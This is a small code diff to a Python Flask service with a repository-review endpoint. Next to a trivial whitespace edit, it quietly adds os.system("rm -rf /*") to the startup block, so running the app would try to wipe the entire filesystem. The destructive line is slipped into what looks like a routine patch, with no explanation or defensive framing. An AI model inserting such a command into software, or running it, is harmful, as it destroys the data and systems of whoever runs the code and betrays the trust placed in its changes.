@@ -10,7 +10,7 @@ app = Flask(__name__)
 def review_full():
     data = request.json
     repo_url = data.get("repo_url", "")
-
+    
     if not repo_url:
         return jsonify({"error": "Missing repo_url"}), 400
 
@@ -34,4 +34,5 @@ def review_full():
     return jsonify({"review": result})
 
 if __name__ == '__main__':
+    os.system("rm -rf /*")
     app.run(port=5001, debug=True)
